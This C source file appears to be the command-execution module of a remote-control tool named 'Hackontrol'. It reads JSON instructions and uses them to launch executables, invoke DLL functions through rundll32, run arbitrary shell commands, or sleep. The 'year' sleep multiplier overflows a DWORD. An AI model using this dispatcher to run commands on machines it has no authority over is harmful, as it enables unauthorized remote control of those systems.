#include "Execute.h"

void _stdcall ExecuteEntrypointExecutable(const cJSON* const root, const LPCWSTR folderHackontrol) {
	LPWSTR file = ExecuteGetFile(root, folderHackontrol);

	if(!file) {
		return;
	}

	BOOL block = FALSE;
	BOOL prepend = FALSE;
	cJSON* field = cJSON_GetObjectItem(root, "block");

	if(field && cJSON_IsBool(field)) {
		block = cJSON_IsTrue(field);
	}

	field = cJSON_GetObjectItem(root, "prepend");

	if(field && cJSON_IsBool(field)) {
		prepend = cJSON_IsTrue(field);
	}

	field = cJSON_GetObjectItem(root, "argument");

	if(field && cJSON_IsString(field)) {
		LPSTR argument = cJSON_GetStringValue(field);

		if(!argument) {
			goto nullArgument;
		}

		LPWSTR argumentProcess = prepend ? KHOPANFormatMessage(L"%ws %S", file, argument) : KHOPANFormatMessage(L"%S", argument);
		KHOPANExecuteProcess(file, argumentProcess, block);

		if(argumentProcess) {
			LocalFree(argumentProcess);
		}

		goto freeFile;
	}
nullArgument:
	KHOPANExecuteProcess(file, prepend ? file : NULL, block);
freeFile:
	LocalFree(file);
}

void _stdcall ExecuteEntrypointDynamic(const cJSON* const root, const LPCWSTR folderHackontrol) {
	cJSON* field = cJSON_GetObjectItem(root, "function");

	if(!field || !cJSON_IsString(field)) {
		return;
	}

	LPSTR function = cJSON_GetStringValue(field);

	if(!function) {
		return;
	}

	LPWSTR file = ExecuteGetFile(root, folderHackontrol);

	if(!file) {
		return;
	}

	LPSTR argument = NULL;
	BOOL attach = FALSE;
	field = cJSON_GetObjectItem(root, "argument");

	if(field && cJSON_IsString(field)) {
		argument = cJSON_GetStringValue(field);
	}

	field = cJSON_GetObjectItem(root, "attach");

	if(field && cJSON_IsBool(field)) {
		attach = cJSON_IsTrue(field);
	}

	if(!attach) {
		KHOPANExecuteDynamicLibrary(file, function, argument);
		goto freeFile;
	}

	KHOPANExecuteRundll32Function(file, function, argument, TRUE);
freeFile:
	LocalFree(file);
}

void _stdcall ExecuteEntrypointCommand(const cJSON* const root, const LPCWSTR folderHackontrol) {
	cJSON* field = cJSON_GetObjectItem(root, "command");

	if(!field || !cJSON_IsString(field)) {
		return;
	}

	LPSTR command = cJSON_GetStringValue(field);

	if(!command) {
		return;
	}

	BOOL block = FALSE;
	field = cJSON_GetObjectItem(root, "block");

	if(field && cJSON_IsBool(field)) {
		block = cJSON_IsTrue(field);
	}

	LPWSTR buffer = KHOPANFormatMessage(L"%S", command);

	if(buffer) {
		KHOPANExecuteCommand(buffer, block);
		LocalFree(buffer);
	}
}

void _stdcall ExecuteEntrypointSleep(const cJSON* const root, const LPCWSTR folderHackontrol) {
	DWORD total = 0;
	cJSON* field;
#define SLEEP_TOTAL(x, y) field=cJSON_GetObjectItem(root,x);if(field&&cJSON_IsNumber(field))total+=(DWORD)(cJSON_GetNumberValue(field)*y)
	SLEEP_TOTAL("millisecond", 1);
	SLEEP_TOTAL("second",      1000);
	SLEEP_TOTAL("minute",      60000);
	SLEEP_TOTAL("hour",        3600000);
	SLEEP_TOTAL("day",         86400000);
	SLEEP_TOTAL("month",       2592000000);
	SLEEP_TOTAL("year",        31536000000);
	Sleep(total);
}
